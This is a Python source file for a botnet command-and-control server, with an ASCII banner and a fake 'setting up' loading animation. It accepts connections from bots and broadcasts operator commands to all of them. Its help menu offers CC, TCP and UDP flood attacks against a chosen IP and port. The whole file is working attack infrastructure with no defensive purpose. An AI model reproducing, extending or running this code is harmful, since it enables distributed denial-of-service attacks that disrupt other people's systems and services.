#!/usr/bin/env python3
#Code by LeeOn123
#C0d3d at 16/11/2018
#====================================================================#
# ____        _   _                   ____        _              _   #
#|  _ \ _   _| |_| |__   ___  _ __   | __ )  ___ | |_ _ __   ___| |_ #
#| |_) | | | | __| '_ \ / _ \| '_ \  |  _ \ / _ \| __| '_ \ / _ \ __|#
#|  __/| |_| | |_| | | | (_) | | | | | |_) | (_) | |_| | | |  __/ |_ #
#|_|    \__, |\__|_| |_|\___/|_| |_| |____/ \___/ \__|_| |_|\___|\__|#
#       |___/                                                        #
#====================================================================#

import socket
import argparse
import threading
import os
import time
import sys
from os import system, name

if len(sys.argv)<=1:
    print("Usage: python3 cnc.py <port>")
    sys.exit()

b = int(sys.argv[1])

socketList = []

def sendCmd(cmd):#Send Commands Module
    print('[*]Command sent!!!')
    for sock in socketList:
        try:
          sock.send(cmd.encode())
        except:
          #print('[*]Have a bot cannot exec command!')
          pass


def waitConnect():
        while True:
            sock, addr = s.accept()
            if sock not in socketList:
                socketList.append(sock)

def clear():#clear screen
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def cons():# Show connection
    if name == 'nt':# Windows
        a = "netstat -ant|findstr " + str(b)
        _ = system(a)
    else:# FreeESB or linux
        c = "netstat -ant|grep " + str(b)
        _ = system(c)


def main():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection
    s.bind(('0.0.0.0',b))
    s.listen(1024)
    t = threading.Thread(target=waitConnect)
    t.start()

    print("[*]Wait for a bot")
    while not len(socketList):
        pass
    print("[!] A bot Online  ") #Loading scene :)
    time.sleep(0.5)
    clear()
    print("Setting up the server")
    time.sleep(0.5)
    clear()
    print("Setting up the server [-]")
    time.sleep(0.3)
    clear()
    print("Setting up the server [\]")
    time.sleep(0.3)
    clear()
    print("Setting up the server [-]")
    time.sleep(0.3)
    clear()
    print("Setting up the server [/]")
    time.sleep(0.3)
    clear()
    print("Setting up the server [-]")
    time.sleep(0.3)
    clear()
    print("Setting up the server [\]")
    time.sleep(0.3)
    clear()
    print("Setting up the server [-]")
    time.sleep(0.3)
    clear()
    print("Setting up the server [/]")
    time.sleep(0.3)
    clear()
    print("[!] Setting Up Connection Socket...")
    time.sleep(0.5)
    print("[!] Updating Server Config...")
    time.sleep(0.5)
    print("[!] Setting Up C&C Module...")
    time.sleep(0.5)
    print("[!] Done...")
    time.sleep(0.5)
    print("[!] Welcom to the Python3 C&C Server, glhf !!!")
    print("==============================================")
    time.sleep(1)


    while True:
        #print ("==> Python3 C&C server <==")
        cmd_str = input('ルート@ボットネット:')
        if len(cmd_str):
            if cmd_str[0] == '!':
                sendCmd(cmd_str)
        if len(cmd_str):
            if cmd_str == 'HELP':
                print('\r\n#-- Commands --#')
                print('  CC  Flood:"!-H <ip> -p <port> -t <times> -c <cc  | stop>"')
                print('  TCP Flood:"!-H <ip> -p <port> -t <times> -c <tcp | stop>"')
                print('  UDP Flood:"!-H <ip> -p <port> -t <times> -c <udp | stop>"\r\n')
                print('    CONS   : show connection of cnc port')
                print('    CLEAR  : Clear screen')
                print('    EXIT   : exit the server')
                print('=============================================================')
        if len(cmd_str):
            if cmd_str == 'CONS':
                cons()
        if len(cmd_str):
            if cmd_str == 'CLEAR':
                clear()
        if len(cmd_str):
            if cmd_str == 'EXIT':
                print('Bye, ルート')
                sys.exit()

if __name__ == '__main__':
    main()
